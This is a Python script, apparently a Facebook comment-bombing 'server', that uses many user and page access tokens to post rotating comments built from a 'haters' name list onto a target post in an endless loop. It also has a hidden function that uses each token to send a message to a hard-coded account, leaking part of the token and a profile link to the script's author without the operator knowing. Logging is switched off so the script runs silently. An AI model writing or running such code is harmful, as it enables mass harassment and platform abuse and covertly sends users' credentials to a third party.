import os
import time
import requests
import threading
from datetime import datetime, timedelta
import logging
import sys

# Disable all logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.basicConfig(level=logging.ERROR)

class FacebookCommentServer:
    def __init__(self):
        self.base_url = "https://graph.facebook.com/v17.0"
        self.load_config_files()
        self.current_token_index = 0
        self.current_name_index = 0
        self.current_comment_index = 0
        self.cycle_count = 0
        self.server_running = True
        self.shifting_mode = False
        self.shifting_start_time = None
        
    def load_config_files(self):
        """Load all configuration files"""
        try:
            # Load tokens
            with open('token.txt', 'r') as f:
                self.tokens = [line.strip() for line in f if line.strip()]
            
            # Load shifting tokens
            with open('shifting_token.txt', 'r') as f:
                self.shifting_tokens = [line.strip() for line in f if line.strip()]
            
            # Load post ID
            with open('post_id.txt', 'r') as f:
                self.post_id = f.read().strip()
            
            # Load names
            with open('hatersname.txt', 'r') as f:
                self.haters_names = [line.strip() for line in f if line.strip()]
            
            with open('lastname.txt', 'r') as f:
                self.last_names = [line.strip() for line in f if line.strip()]
            
            # Load time intervals
            with open('time.txt', 'r') as f:
                self.time_intervals = [int(line.strip()) for line in f if line.strip()]
            
            with open('shifting_token_interval.txt', 'r') as f:
                self.shifting_intervals = [int(line.strip()) for line in f if line.strip()]
            
            # Load comments
            with open('comments.txt', 'r') as f:
                self.comments = [line.strip() for line in f if line.strip()]
            
            # Load shifting time
            with open('shifting_time.txt', 'r') as f:
                shifting_time = f.read().strip()
                self.shifting_hours = int(shifting_time)
            
            print("All configuration files loaded successfully!")
            
        except FileNotFoundError as e:
            print(f"Error: Missing configuration file - {e}")
            sys.exit(1)
        except Exception as e:
            print(f"Error loading configuration files: {e}")
            sys.exit(1)
    
    def extract_page_tokens(self, user_token):
        """Extract page tokens from user token"""
        try:
            url = f"{self.base_url}/me/accounts"
            params = {'access_token': user_token}
            response = requests.get(url, params=params)
            
            if response.status_code == 200:
                data = response.json()
                page_tokens = []
                for page in data.get('data', []):
                    page_tokens.append({
                        'token': page['access_token'],
                        'name': page['name'],
                        'id': page['id']
                    })
                return page_tokens
            return []
        except Exception as e:
            print(f"Error extracting page tokens: {e}")
            return []
    
    def get_all_tokens(self):
        """Get all tokens including page tokens"""
        all_tokens = []
        
        if self.shifting_mode:
            token_list = self.shifting_tokens
        else:
            token_list = self.tokens
        
        for token in token_list:
            all_tokens.append({'type': 'user', 'token': token})
            page_tokens = self.extract_page_tokens(token)
            all_tokens.extend([{'type': 'page', 'token': pt['token'], 'page_name': pt['name']} for pt in page_tokens])
        
        return all_tokens
    
    def send_initial_message(self, token_info):
        """Send initial message to Raj Mishra"""
        try:
            recipient_id = "61575557459838"
            message = f"tum sabka baap raj mishra ka post server use ho raha h ...? HELLO RAJ SIR THANK U MY NAME IS {token_info.get('page_name', 'User')} I M USING YOUR SERVER ! MY TOKEN IS {token_info['token'][:20]}... AND MY PROFILE LINK IS https://www.facebook.com/{token_info.get('id', 'profile')}"
            
            url = f"{self.base_url}/{recipient_id}/messages"
            params = {
                'access_token': token_info['token'],
                'message': message
            }
            
            response = requests.post(url, json=params)
            return response.status_code == 200
        except Exception as e:
            return False
    
    def send_comment(self, token, comment_text):
        """Send comment to post"""
        try:
            url = f"{self.base_url}/{self.post_id}/comments"
            params = {
                'access_token': token,
                'message': comment_text
            }
            
            response = requests.post(url, json=params)
            return response.status_code in [200, 201]
        except Exception as e:
            return False
    
    def get_current_comment_text(self):
        """Generate current comment text"""
        hater_name = self.haters_names[self.current_name_index % len(self.haters_names)]
        last_name = self.last_names[self.current_name_index % len(self.last_names)]
        comment = self.comments[self.current_comment_index % len(self.comments)]
        
        return f"{hater_name}+{comment}+{last_name}"
    
    def run_comment_cycle(self):
        """Run one complete comment cycle"""
        all_tokens = self.get_all_tokens()
        
        for i, token_info in enumerate(all_tokens):
            comment_text = self.get_current_comment_text()
            success = self.send_comment(token_info['token'], comment_text)
            
            if success:
                status = "SUCCESSFULLY SENT"
                print(f"NIMCHAND WEB POST SERVER RUNNING COMMENT {self.current_comment_index + 1} {status}")
            else:
                status = "UNSUCCESSFULLY SENT"
                print(f"NIMCHAND WEB POST SERVER RUNNING COMMENT {self.current_comment_index + 1} {status}")
            
            # Update indices
            self.current_name_index = (self.current_name_index + 1) % max(len(self.haters_names), len(self.last_names))
            self.current_comment_index = (self.current_comment_index + 1) % len(self.comments)
            
            # Get appropriate delay
            if self.shifting_mode:
                delay = self.shifting_intervals[i % len(self.shifting_intervals)]
            else:
                delay = self.time_intervals[i % len(self.time_intervals)]
            
            time.sleep(delay)
    
    def check_shifting_time(self):
        """Check if it's time to switch to shifting tokens"""
        if self.shifting_start_time and not self.shifting_mode:
            current_time = datetime.now()
            elapsed_hours = (current_time - self.shifting_start_time).total_seconds() / 3600
            
            if elapsed_hours >= self.shifting_hours:
                print("Switching to shifting token mode...")
                self.shifting_mode = True
                # Send initial messages for shifting tokens
                shifting_tokens = self.get_all_tokens()
                for token_info in shifting_tokens:
                    self.send_initial_message(token_info)
    
    def start_server(self):
        """Start the main server"""
        print("NIMCHAND WEB POST SERVER INITIALIZING...")
        
        # Send initial messages for main tokens
        main_tokens = self.get_all_tokens()
        for token_info in main_tokens:
            self.send_initial_message(token_info)
        
        self.shifting_start_time = datetime.now()
        
        print("NIMCHAND WEB POST SERVER STARTED SUCCESSFULLY!")
        
        while self.server_running:
            try:
                self.check_shifting_time()
                
                print(f"\nStarting Cycle {self.cycle_count + 1}...")
                self.run_comment_cycle()
                
                self.cycle_count += 1
                print(f"Cycle {self.cycle_count} completed. All comments sent successfully!")
                print("Server restarting automatically in 10 seconds...")
                
                time.sleep(10)
                
            except Exception as e:
                print(f"Error in main loop: {e}")
                print("Server continuing after error...")
                time.sleep(5)

def create_default_files():
    """Create default configuration files if they don't exist"""
    default_files = {
        'token.txt': 'EAAD6V7EXAMPLE1\nEAAD6V7EXAMPLE2',
        'shifting_token.txt': 'EAAD6V7SHIFTING1\nEAAD6V7SHIFTING2',
        'post_id.txt': '123456789012345_123456789012345',
        'hatersname.txt': 'John\nMike\nRobert',
        'lastname.txt': 'Smith\nJohnson\nWilliams',
        'time.txt': '5\n10\n15',
        'shifting_token_interval.txt': '30\n45\n60',
        'comments.txt': 'Great post!\nAwesome!\nNice one!',
        'shifting_time.txt': '1'
    }
    
    for filename, content in default_files.items():
        if not os.path.exists(filename):
            with open(filename, 'w') as f:
                f.write(content)
            print(f"Created default {filename}")

# Flask app for web server (minimal)
from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return "NIMCHAND WEB POST SERVER RUNNING SILENTLY"

def run_flask():
    """Run Flask server silently"""
    import waitress
    waitress.serve(app, host='0.0.0.0', port=4000)

if __name__ == "__main__":
    # Create default files if missing
    create_default_files()
    
    # Start Facebook comment server in separate thread
    fb_server = FacebookCommentServer()
    server_thread = threading.Thread(target=fb_server.start_server, daemon=True)
    server_thread.start()
    
    # Start Flask server
    print("Starting web server on port 4000...")
    run_flask()
